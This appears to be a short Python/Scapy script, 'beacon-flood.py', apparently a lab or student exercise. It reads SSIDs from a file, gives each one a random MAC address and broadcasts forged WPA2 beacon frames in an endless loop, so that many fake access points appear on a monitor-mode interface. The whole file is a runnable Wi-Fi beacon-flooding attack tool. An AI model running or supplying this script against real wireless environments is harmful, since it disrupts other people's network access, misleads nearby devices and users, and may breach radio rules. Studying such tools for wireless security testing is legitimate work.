from scapy.all import *
import string
import random
import sys
import re


class Beacon:
    def __init__(self):
        self.addr = ""
        self.ssid = 0

    def setData(self, ssid):
        for _ in range(12):
            self.addr += random.choice(string.hexdigits[:-6])
        self.addr = re.sub(r".{2}(?=.{2})", r"\g<0>:", self.addr)
        self.ssid = ssid


def usage():
    print("syntax : python beacon-flood.py <interface> <ssid-list-file>")
    print("sample : python beacon-flood.py mon0 ssid-list.txt")
    sys.exit()


if __name__ == '__main__':
    if len(sys.argv) != 3:
        usage()

    if resolve_iface(sys.argv[1]) == None:
        print("[!] Interface not exists!")
        sys.exit()

    beaconList = []
    with open(sys.argv[2]) as f:
        ssidList = f.readlines()
        for ssid in ssidList:
            beacon = Beacon()
            beacon.setData(ssid)
            beaconList.append(beacon)

    while True:
        for beacon in beaconList:
            frame = RadioTap()
            frame /= Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=beacon.addr, addr3=beacon.addr)
            frame /= Dot11Beacon(cap="ESS+privacy")
            frame /= Dot11Elt(ID="SSID", info=beacon.ssid, len=len(beacon.ssid))
            frame /= Dot11Elt(ID='RSNinfo', info=(
                '\x01\x00'
                '\x00\x0f\xac\x02'
                '\x02\x00'
                '\x00\x0f\xac\x04'
                '\x00\x0f\xac\x02'
                '\x01\x00'
                '\x00\x0f\xac\x02'
                '\x00\x00'))
            frame /= Dot11Elt(ID="Rates", info="\x82\x84\x8b\x96\x0c\x12\x18\x24")
            frame /= Dot11Elt(ID="DSset", info="\x0A")

            print(f'[*] Broadcast ADDR: {beacon.addr:s} SSID: {beacon.ssid:s}')
            sendp(frame, iface=sys.argv[1], inter=.001, loop=0)

            # Multithread next time...
